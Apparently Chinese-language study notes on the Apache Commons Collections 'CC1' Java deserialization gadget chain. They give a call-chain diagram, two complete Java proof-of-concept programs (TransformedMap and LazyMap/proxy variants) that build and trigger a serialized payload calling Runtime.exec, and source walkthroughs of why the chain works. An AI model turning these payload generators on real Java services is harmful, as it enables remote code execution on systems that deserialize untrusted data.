## AnnotationInvocationHandler

调用链

```
ObjectInputStream.readObject()
  ->AnnotationInvocationHandler.readObject()
      ->TransformedMap.entrySet().iterator().next().setValue()
          ->TransformedMap.checkSetValue()
        ->TransformedMap.transform()
          ->ChainedTransformer.transform()
            ->ConstantTransformer.transform()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Class.getMethod()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.getRuntime()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.exec()
```

`sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(`Java动态代理`)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中还间接的调用了`TransformedMap`中`MapEntry`的`setValue`方法，从而也就触发了`transform`方法，完成了整个攻击链的调用。

```java
package org.example;

import java.lang.annotation.Target;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.reflect.annotation.*;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
//import sun.reflect.annotation.AnnotationInvocationHandler;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static  void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {

        String cmd = "calc";

        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod" ,new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 创建Map对象
        Map map = new HashMap();
        map.put("value", "value");

        // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
        Map transformerMap = TransformedMap.decorate(map, null, chainedTransformer);

        String classname = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class reClass = Class.forName(classname);
        Constructor constructor = reClass.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Target.class, transformerMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream out = new ObjectOutputStream(baos);

        out.writeObject(instance);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

        System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

        ObjectInputStream in = new ObjectInputStream(bais);

        in.readObject();
    }
}

```

### LazyMap链

```java
package org.example;

import java.lang.annotation.Retention;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;


import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
//import sun.reflect.annotation.AnnotationInvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class CC1_lazy {
    public static  void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {

        String cmd = "calc";

        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod" ,new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 创建Map对象
        Map map = new HashMap();

        Map lazy = LazyMap.decorate(map,chainedTransformer);


        String classname = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class reClass = Class.forName(classname);
        Constructor constructor = reClass.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        //这里第一个参数必须是注释类型的
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazy);

        // 创建 AnnotationInvocationHandler 的代理
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        //proxyMap.size();
        //再实例化一个 AnnotationInvocationHandler 包裹我们的代理对象 proxyMap
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream out = new ObjectOutputStream(baos);

        out.writeObject(handler);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

        System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

        ObjectInputStream in = new ObjectInputStream(bais);

        in.readObject();
    }
}

```

这里触发的是AnnotationInvocationHandler的invoke方法，采用动态代理的方式。创建一个 AnnotationInvocationHandler 的代理类，当调用 AnnotationInvocationHandler 的代理类里的任意方法时都会先调用 AnnotationInvocationHandler#invoke() 方法

```java
        //这里第一个参数必须是注释类型的
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazy);
```

原因在于Annotation.....的构造方法

```java
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
```

这里必须是注释类型才能进if判断赋值

创建动态代理类后进invoke,我们传的lazy最终会触发get方法里面的transform

```java
    public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key); //在这里
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
```

